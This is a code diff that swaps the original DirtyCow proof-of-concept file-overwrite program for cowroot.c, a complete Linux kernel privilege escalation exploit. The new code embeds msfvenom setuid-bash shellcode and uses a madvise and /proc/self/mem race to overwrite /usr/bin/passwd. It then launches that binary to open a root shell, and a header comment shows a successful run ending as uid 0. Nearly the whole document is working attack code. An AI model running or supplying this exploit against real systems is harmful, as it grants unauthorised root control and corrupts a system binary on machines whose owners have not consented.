@@ -1,114 +1,158 @@
 /*
-####################### dirtyc0w.c #######################
-$ sudo -s
-# echo this is not a test > foo
-# chmod 0404 foo
-$ ls -lah foo
--r-----r-- 1 root root 19 Oct 20 15:23 foo
-$ cat foo
-this is not a test
-$ gcc -pthread dirtyc0w.c -o dirtyc0w
-$ ./dirtyc0w foo m00000000000000000
-mmap 56123000
-madvise 0
-procselfmem 1800000000
-$ cat foo
-m00000000000000000
-####################### dirtyc0w.c #######################
+* (un)comment correct payload first (x86 or x64)!
+* 
+* $ gcc cowroot.c -o cowroot -pthread
+* $ ./cowroot
+* DirtyCow root privilege escalation
+* Backing up /usr/bin/passwd.. to /tmp/bak
+* Size of binary: 57048
+* Racing, this may take a while..
+* /usr/bin/passwd overwritten
+* Popping root shell.
+* Don't forget to restore /tmp/bak
+* thread stopped
+* thread stopped
+* root@box:/root/cow# id
+* uid=0(root) gid=1000(foo) groups=1000(foo)
+*
+* @robinverton 
 */
+
 #include <stdio.h>
+#include <stdlib.h>
 #include <sys/mman.h>
 #include <fcntl.h>
 #include <pthread.h>
-#include <unistd.h>
-#include <sys/stat.h>
 #include <string.h>
-#include <stdint.h>
+#include <unistd.h>
 
 void *map;
 int f;
+int stop = 0;
 struct stat st;
 char *name;
- 
+pthread_t pth1,pth2,pth3;
+
+// change if no permissions to read
+char suid_binary[] = "/usr/bin/passwd";
+
+/*
+* $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
+*/ 
+unsigned char sc[] = {
+  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
+  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
+  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
+  0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,
+  0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
+};
+unsigned int sc_len = 177;
+
+/*
+* $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
+unsigned char sc[] = {
+  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,
+  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
+  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
+  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,
+  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,
+  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,
+  0x89, 0xe1, 0xcd, 0x80
+};
+unsigned int sc_len = 136;
+*/
+
 void *madviseThread(void *arg)
 {
-  char *str;
-  str=(char*)arg;
-  int i,c=0;
-  for(i=0;i<100000000;i++)
-  {
-/*
-You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
-> This is achieved by racing the madvise(MADV_DONTNEED) system call
-> while having the page of the executable mmapped in memory.
-*/
-    c+=madvise(map,100,MADV_DONTNEED);
-  }
-  printf("madvise %d\n\n",c);
+    char *str;
+    str=(char*)arg;
+    int i,c=0;
+    for(i=0;i<1000000 && !stop;i++) {
+        c+=madvise(map,100,MADV_DONTNEED);
+    }
+    printf("thread stopped\n");
 }
- 
+
 void *procselfmemThread(void *arg)
 {
-  char *str;
-  str=(char*)arg;
-/*
-You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
->  The in the wild exploit we are aware of doesn't work on Red Hat
->  Enterprise Linux 5 and 6 out of the box because on one side of
->  the race it writes to /proc/self/mem, but /proc/self/mem is not
->  writable on Red Hat Enterprise Linux 5 and 6.
-*/
-  int f=open("/proc/self/mem",O_RDWR);
-  int i,c=0;
-  for(i=0;i<100000000;i++) {
-/*
-You have to reset the file pointer to the memory position.
-*/
-    lseek(f,(uintptr_t) map,SEEK_SET);
-    c+=write(f,str,strlen(str));
-  }
-  printf("procselfmem %d\n\n", c);
+    char *str;
+    str=(char*)arg;
+    int f=open("/proc/self/mem",O_RDWR);
+    int i,c=0;
+    for(i=0;i<1000000 && !stop;i++) {
+        lseek(f,map,SEEK_SET);
+        c+=write(f, str, sc_len);
+    }
+    printf("thread stopped\n");
 }
- 
- 
-int main(int argc,char *argv[])
-{
-/*
-You have to pass two arguments. File and Contents.
-*/
-  if (argc<3) {
-  (void)fprintf(stderr, "%s\n",
-      "usage: dirtyc0w target_file new_content");
-  return 1; }
-  pthread_t pth1,pth2;
-/*
-You have to open the file in read only mode.
-*/
-  f=open(argv[1],O_RDONLY);
-  fstat(f,&st);
-  name=argv[1];
-/*
-You have to use MAP_PRIVATE for copy-on-write mapping.
-> Create a private copy-on-write mapping.  Updates to the
-> mapping are not visible to other processes mapping the same
-> file, and are not carried through to the underlying file.  It
-> is unspecified whether changes made to the file after the
-> mmap() call are visible in the mapped region.
-*/
-/*
-You have to open with PROT_READ.
-*/
-  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
-  printf("mmap %zx\n\n",(uintptr_t) map);
-/*
-You have to do it on two threads.
-*/
-  pthread_create(&pth1,NULL,madviseThread,argv[1]);
-  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
-/*
-You have to wait for the threads to finish.
-*/
-  pthread_join(pth1,NULL);
-  pthread_join(pth2,NULL);
-  return 0;
+
+void *waitForWrite(void *arg) {
+    char buf[sc_len];
+
+    for(;;) {
+        FILE *fp = fopen(suid_binary, "rb");
+
+        fread(buf, sc_len, 1, fp);
+
+        if(memcmp(buf, sc, sc_len) == 0) {
+            printf("%s overwritten\n", suid_binary);
+            break;
+        }
+
+        fclose(fp);
+        sleep(1);
+    }
+
+    stop = 1;
+
+    printf("Popping root shell.\n");
+    printf("Don't forget to restore /tmp/bak\n");
+
+    system(suid_binary);
+}
+
+int main(int argc,char *argv[]) {
+    char *backup;
+
+    printf("DirtyCow root privilege escalation\n");
+    printf("Backing up %s to /tmp/bak\n", suid_binary);
+
+    asprintf(&backup, "cp %s /tmp/bak", suid_binary);
+    system(backup);
+
+    f = open(suid_binary,O_RDONLY);
+    fstat(f,&st);
+
+    printf("Size of binary: %d\n", st.st_size);
+
+    char payload[st.st_size];
+    memset(payload, 0x90, st.st_size);
+    memcpy(payload, sc, sc_len+1);
+
+    map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
+
+    printf("Racing, this may take a while..\n");
+
+    pthread_create(&pth1, NULL, &madviseThread, suid_binary);
+    pthread_create(&pth2, NULL, &procselfmemThread, payload);
+    pthread_create(&pth3, NULL, &waitForWrite, NULL);
+
+    pthread_join(pth3, NULL);
+
+    return 0;
 }
